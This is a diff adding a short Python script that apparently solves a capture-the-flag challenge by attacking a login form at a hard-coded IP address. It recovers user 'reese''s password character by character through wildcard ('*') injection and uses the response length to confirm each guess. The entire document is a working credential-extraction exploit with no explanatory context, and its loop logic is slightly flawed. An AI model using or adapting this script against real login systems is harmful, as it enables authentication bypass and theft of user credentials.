@@ -1,0 +1,22 @@
+import requests
+from string import ascii_lowercase, ascii_uppercase
+
+url = 'http://188.166.173.208:31780/login'
+headers = {'Host':'188.166.173.208:31780','Content-Type':'application/x-www-form-urlencoded','Connection':'close'}
+chars = ascii_lowercase + ascii_uppercase + '0123456789_(){}'
+passwd = ''
+# modified the passwd line from passwd='' 
+
+while(1):
+	for char in chars:
+		tmp = passwd + char + '*'
+		data = {'username':'reese','password':tmp}
+		r = requests.post(url, headers=headers, data=data)
+
+		if r.headers['Content-Length'] == '2586':
+			passwd += char
+		elif char == '}':
+			print(passwd)
+			break
+
+print(passwd)
